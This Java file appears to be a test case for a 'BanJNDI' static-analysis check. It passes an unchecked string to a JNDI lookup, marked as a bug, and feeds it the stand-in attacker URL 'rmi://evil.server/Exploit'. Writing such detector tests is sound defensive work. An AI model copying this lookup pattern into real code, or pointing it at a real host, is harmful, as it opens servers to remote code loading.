import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    public boolean getFalseCondition() {
        return false;
    }

    public String showBug(String jndiUrl) throws NamingException {
        if (getFalseCondition()) {
            // Unreachable code
            System.out.println("This line should never be executed.");
        }
        Context ctx = new InitialContext();
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}